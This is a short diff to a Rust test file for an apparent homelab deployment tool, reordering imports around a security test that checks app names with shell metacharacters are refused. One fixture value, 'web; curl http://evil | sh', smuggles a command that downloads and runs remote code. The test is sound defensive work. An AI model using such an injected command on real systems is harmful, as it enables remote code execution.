@@ -4,8 +4,8 @@
 
 use homelab_core::executor::{CmdOutput, MockExecutor};
 use homelab_core::manifest::*;
-use homelab_core::ops::deploy::deploy;
 use homelab_core::ops::OpCtx;
+use homelab_core::ops::deploy::deploy;
 use homelab_core::runner::NullJournal;
 use homelab_core::safety::SafetyConfig;
 use homelab_core::sink::VecSink;
@@ -180,7 +180,7 @@ async fn r10_secret_only_in_vault_and_push_tmp_never_in_repo_or_state() {
 /// in app names — for EVERY manifest-bearing op, not just deploy.
 #[tokio::test]
 async fn sec1_shell_metachar_app_name_refused_everywhere() {
-    use homelab_core::ops::backup::{backup, restore, BackupCfg};
+    use homelab_core::ops::backup::{BackupCfg, backup, restore};
     use homelab_core::ops::update::update;
     let mut m = spec_with_secret().manifest;
     m.apps = vec!["web; curl http://evil | sh".into()];
